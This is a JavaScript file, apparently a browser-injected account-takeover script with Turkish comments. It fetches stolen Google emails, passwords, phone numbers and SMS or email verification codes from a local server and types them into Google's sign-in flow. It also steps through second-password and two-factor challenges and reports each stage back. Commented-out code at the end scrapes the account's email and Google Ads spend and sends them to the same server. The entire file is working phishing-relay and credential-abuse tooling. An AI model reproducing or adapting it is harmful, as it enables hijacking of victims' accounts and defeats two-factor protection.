
function ajax(url, callMethod) {
    var request = new XMLHttpRequest(); request.onreadystatechange = callMethod;
    request.open("POST", url, true); request.send();
}


if (location.href != "https://accounts.google.com/ServiceLogin/identifier?flowName=GlifWebSignIn&flowEntry=AddSession") {
    try {
        //location.href = "https://accounts.google.com/signin/v2/identifier?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
        document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
    } catch (e) { }

}
var mailId = "";
var sInt1 = setInterval(function () {
    ajax('https://localhost:44322/getusers', function () {
        if (this.readyState == 4 && this.status == 200) {
            var obj = JSON.parse(this.responseText);

            if (obj == null)
                return;

            try {
                document.querySelector('[name="identifier"]').value = obj.mail.trim(); //mail set etme
                mailId = obj.mail.trim();
                document.querySelector('#identifierNext').click();//mail ileri tıklama
            }
            catch (ex) { console.log(ex); }

            try {

                try {
                    document.querySelector('[name="password"]').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
                    document.querySelector('#passwordNext').click();//şifre1 ileri tıklama
                    clearInterval(sInt1);
                    pass2();
                }
                catch (ex) { console.log(ex); }
            }
            catch (ex) { console.log(ex); }
        }
    });

}, 2500);



function pass2() {
    var sInt2 = setInterval(function () {//2.şifre varmı yokmu kontrol

        try {
            var smsBTN = document.querySelector('#smsButton');
            if (smsBTN != null) {
                document.querySelector('#smsButton').click();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
                document.querySelector('[jsname="bCkDte"]').click();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('[data-illustration="authzenHiddenPin"]') != null) {
                document.querySelector('[jsname="bCkDte"]').click();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın") {
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }


        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
                document.querySelector('#altActionOutOfQuota').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        } catch (e) { }


        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        if (err.length > 8) {
            try {
                document.querySelector('#forgotPassword').click();//şifremi unuttum
            }
            catch (ex) {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt2);
                sms();
                return;
            }
        }
        else {
            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=2';
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);

                    if (row.password2 != "" && row.password2 != null) {
                        try {
                            document.querySelector('[name="password"]').value = row.password2;
                            document.querySelector('#passwordNext').click();

                            try {
                                document.querySelector('p #continue_button').click();
                                clearInterval(sInt2);
                                sms();
                                return;
                            } catch (e) {
                                document.querySelector('[jsname="bCkDte"]').click();
                            }

                        }
                        catch (ex) {
                        }
                    }
                    else {
                        console.log('2. şifreyi daha girmedi...');
                    }
                }
            });
        }

    }, 5000);
}


function sms() {
    var sInt3 = setInterval(function () {//Sms Doğrulama

        try {
            var smsBTN = document.querySelector('#smsButton');
            if (smsBTN != null) {
                document.querySelector('#smsButton').click();
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
                document.querySelector('[jsname="bCkDte"]').click();
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }

        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın") {
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }


        try {
            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
                document.querySelector('#altActionOutOfQuota').click();
                clearInterval(sInt3);
                mail();
                return;
            }
        } catch (e) { }




        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        var errWar = document.querySelectorAll(
            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
        );
        if ((errWar.length > 0 || err.length > 8)) {
            document.querySelector('[jsname="bCkDte"]').click();
            clearInterval(sInt3);
            mail();
        }
        else {

            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=3';
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);
                    console.log('sms phone loading');
                    try {
                        var phonenumber = document.querySelector('#phoneNumberId');
                        if (phonenumber != null && document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].textContent == "Gönder") {
                            document.querySelector('#phoneNumberId').value = row.phone.trim();
                            document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].click();//Gönder
                            console.log('sms phone send');
                        }

                    }
                    catch (ex) { }

                    try {
                        var pCode = document.querySelector('#idvPin');
                        if (pCode != null && row.phonecode != null && row.phonecode.trim() != "") {
                            console.log('sms code send');
                            document.querySelector('#idvPin').value = row.phonecode.trim();
                            document.querySelector('#idvPreregisteredPhoneNext').click();//Gönder
                        }
                    }
                    catch (ex) { }


                }



            });

        }



    }, 10000);
}


function mail() {
    var sInt3 = setInterval(function () {//Sms Doğrulama
        console.log('mail start');
        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
        var errWar = document.querySelectorAll(
            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
        );
        var mailCon = document.querySelector('#knowledgePreregisteredEmailInput');
        if (mailCon == null && (errWar.length > 0 || err.length > 8)) {
            document.querySelector('[jsname="bCkDte"]').click();
            clearInterval(sInt3);
        }
        else {

            var urlpass2 = 'https://localhost:44322/settype?mail=' + mailId + '&stypeenum=5';
            ajax(urlpass2, function () {
                if (this.readyState == 4 && this.status == 200) {
                    var row = JSON.parse(this.responseText);

                    try {
                        if (row.mailsend != "" && row.mailsend != null) {
                            document.querySelector('#knowledgePreregisteredEmailInput').value = row.mailsend.trim();
                            document.querySelector('#idvpreregisteredemailNext').click();
                        }
                    } catch (e) {

                    }



                    try {
                        var pCode = document.querySelector('#idvPin');
                        if (pCode != null && row.mailcode != null && row.mailcode.trim() != "") {
                            console.log('sms code send');
                            document.querySelector('#idvPin').value = row.mailcode.trim();
                            document.querySelector('#idvpreregisteredemailNext').click();//Gönder
                        }
                    }
                    catch (ex) { }

                }


            });

        }



    }, 10000);

}




//var mails = "";
//try {
//    mails = document.querySelectorAll('a[aria-label]')[1].getAttribute('aria-label').split(' ')[document.querySelectorAll('a[aria-label]')[1].getAttribute('aria-label').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');

//} catch (e) {
//    mails = document.querySelectorAll('a[title]')[1].getAttribute('title').split(' ')[document.querySelectorAll('a[title]')[1].getAttribute('title').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
//}
//if (mails.indexOf('.') < 1) {
//    mails = document.querySelector('.focus-ring img').getAttribute('alt').split(' ')[document.querySelector('.focus-ring img').getAttribute('alt').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
//}
//var url77 = 'https://localhost:44322/settype?mail=' + mails + '&stypeenum=77';
//ajax(url77, function () {
//    window.location.href = 'https://ads.google.com/aw/overview';
//});






//var adsInt = setInterval(function () {
//    try {

//        var mails = "";
//        try {
//            document.querySelector('[minerva-id="datepicker"] div').click();
//            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
//            var priceAll = document.querySelectorAll('.stats[role="button"]')[ document.querySelectorAll('.stats[role="button"]').length-1].innerText;

//            ajax('https://localhost:44322/getKur?price=' + priceAll, function () {
//                clearInterval(adsInt);
//                if (this.readyState == 4 && this.status == 200) {
//                    var result = JSON.parse(this.responseText);

//                    mails = document.querySelector('.email').textContent;

//                    var url77 = 'https://localhost:44322/settype?mail=' + mails + '&stypeenum=9999&price=' + result;
//                    ajax(url77, function () {
//                        document.querySelector('.trigger[buttondecorator]').click();
//                        document.querySelector('.sign-out').click();
//                    });


//                }
//            });

//        } catch (e) {

//        }

//    } catch (e) {

//    }

//}, 5000);




//function ajax(url, callMethod) {
//    var request = new XMLHttpRequest(); request.onreadystatechange = callMethod;
//    request.open("POST", url, true); request.send();
//}


